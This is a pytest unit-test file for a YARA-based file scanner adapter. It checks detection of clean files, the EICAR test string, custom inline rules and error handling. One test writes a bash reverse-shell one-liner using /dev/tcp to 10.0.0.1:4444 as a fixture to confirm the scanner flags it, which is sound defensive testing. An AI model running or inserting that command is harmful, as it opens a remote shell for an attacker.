"""Unit tests for YaraRuleScannerAdapter."""

from pathlib import Path
from unittest.mock import MagicMock

import pytest

from hexaqueue_scanner.adapters.yara import YaraRuleScannerAdapter
from hexaqueue_scanner.domain.config import YaraRuleConfig


@pytest.mark.asyncio
async def test_yara_ping() -> None:
    """Verify YARA engine ping returns True."""
    adapter = YaraRuleScannerAdapter()
    healthy = await adapter.ping()
    assert healthy is True


@pytest.mark.asyncio
async def test_yara_missing_file() -> None:
    """Verify scanning missing file reports FileNotFoundError."""
    adapter = YaraRuleScannerAdapter()
    res = await adapter.scan_file(Path("/tmp/not-found-yara-123.bin"))
    clean = res.is_clean
    assert clean is False
    has_err = "FileNotFoundError" in (res.threat_name or "")
    assert has_err is True


@pytest.mark.asyncio
async def test_yara_clean_file(tmp_path: Path) -> None:
    """Verify benign text file passes scan as clean."""
    clean_file = tmp_path / "hello.txt"
    clean_file.write_text("Standard clean python application content")

    adapter = YaraRuleScannerAdapter()
    res = await adapter.scan_file(clean_file)

    clean = res.is_clean
    assert clean is True
    threat = res.threat_name
    assert threat is None


@pytest.mark.asyncio
async def test_yara_eicar_signature_match(tmp_path: Path) -> None:
    """Verify built-in EICAR test string detection in fallback engine."""
    eicar_file = tmp_path / "eicar.txt"
    eicar_file.write_bytes(
        b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    )

    adapter = YaraRuleScannerAdapter()
    res = await adapter.scan_file(eicar_file)

    clean = res.is_clean
    assert clean is False
    threat = res.threat_name
    assert threat == "Standard.EICAR.TestFile"


@pytest.mark.asyncio
async def test_yara_reverse_shell_match(tmp_path: Path) -> None:
    """Verify reverse shell heuristic pattern detection."""
    bad_script = tmp_path / "rev.sh"
    bad_script.write_bytes(b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")

    adapter = YaraRuleScannerAdapter()
    res = await adapter.scan_file(bad_script)

    clean = res.is_clean
    assert clean is False
    threat = res.threat_name
    assert threat == "Exploit.ReverseShell.DevTcp"


@pytest.mark.asyncio
async def test_yara_inline_rule_match(tmp_path: Path) -> None:
    """Verify inline regex pattern configuration matching."""
    cfg = YaraRuleConfig(
        inline_rules=[
            'rule custom { strings: $a = "CUSTOM_MALWARE_MARKER" condition: $a }'
        ]
    )
    adapter = YaraRuleScannerAdapter(config=cfg)

    test_file = tmp_path / "payload.bin"
    test_file.write_bytes(b"data with CUSTOM_MALWARE_MARKER embedded inside")

    res = await adapter.scan_file(test_file)
    clean = res.is_clean
    assert clean is False
    threat = res.threat_name
    assert threat is not None
    has_marker = "CUSTOM_MALWARE_MARKER" in threat
    assert has_marker is True


@pytest.mark.asyncio
async def test_yara_native_rules_mock(tmp_path: Path) -> None:
    """Verify native YARA match evaluation logic."""
    test_file = tmp_path / "native.bin"
    test_file.write_bytes(b"sample")

    adapter = YaraRuleScannerAdapter()
    mock_rules = MagicMock()
    mock_match = MagicMock()
    mock_match.rule = "Apt29_Trojan"
    mock_rules.match.return_value = [mock_match]

    adapter._compiled_yara_rules = mock_rules

    res = await adapter.scan_file(test_file)
    clean = res.is_clean
    assert clean is False
    engine = res.scanner_engine
    assert engine == "YARA-native"
    threat = res.threat_name
    assert threat == "YaraRuleMatch: Apt29_Trojan"

    # Clean match case
    mock_rules.match.return_value = []
    clean_res = await adapter.scan_file(test_file)
    assert clean_res.is_clean is True

    # Error case
    mock_rules.match.side_effect = RuntimeError("YARA match timeout")
    err_res = await adapter.scan_file(test_file)
    assert err_res.is_clean is False
    assert "YaraEvaluationError" in (err_res.threat_name or "")


def test_yara_initialization_with_mock_yara() -> None:
    """Verify rules compilation when native yara library is available."""
    from unittest.mock import patch

    mock_yara = MagicMock()
    mock_yara.compile = MagicMock(return_value="compiled_rules_handle")

    cfg = YaraRuleConfig(
        inline_rules=['rule r { strings: $a = "test" condition: $a }'],
        rule_paths=["/etc/rules.yar"],
    )

    with patch("importlib.import_module", return_value=mock_yara):
        adapter = YaraRuleScannerAdapter(config=cfg)

    compiled = adapter._compiled_yara_rules
    assert compiled == "compiled_rules_handle"
    mock_yara.compile.assert_called_once()


@pytest.mark.asyncio
async def test_yara_file_read_error(tmp_path: Path) -> None:
    """Verify read errors during heuristic evaluation return FileReadError."""
    from unittest.mock import patch

    test_file = tmp_path / "locked.bin"
    test_file.write_bytes(b"content")

    adapter = YaraRuleScannerAdapter()
    with patch.object(Path, "read_bytes", side_effect=PermissionError("EACCES")):
        res = await adapter.scan_file(test_file)

    clean = res.is_clean
    assert clean is False
    has_err = "FileReadError" in (res.threat_name or "")
    assert has_err is True
